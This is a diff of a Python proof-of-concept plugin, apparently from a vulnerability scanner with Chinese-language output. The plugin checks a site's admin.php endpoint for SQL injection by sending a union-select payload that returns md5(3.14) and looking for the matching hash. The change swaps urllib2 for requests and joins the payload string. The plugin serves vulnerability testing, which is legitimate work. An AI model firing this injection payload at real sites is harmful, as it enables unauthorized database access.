@@ -33,13 +33,10 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            verify_url = '{target}'.format(target=self.target)+('/admin.php?c=ajax&f=exit&filename=opt&group_id=1 union select '
-                                                  '3,1,0,md5(3.14),1,6 %23&identifier=1')
+            verify_url = '{target}'.format(target=self.target)+('/admin.php?c=ajax&f=exit&filename=opt&group_id=1 union select '+'3,1,0,md5(3.14),1,6 %23&identifier=1')
             
-            req = urllib2.Request(verify_url)
-
-            content = urllib2.urlopen(req).read()
-            if "4beed3b9c4a886067de0e3a094246f78" in content:
+            req = requests.get(verify_url)
+            if "4beed3b9c4a886067de0e3a094246f78" in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
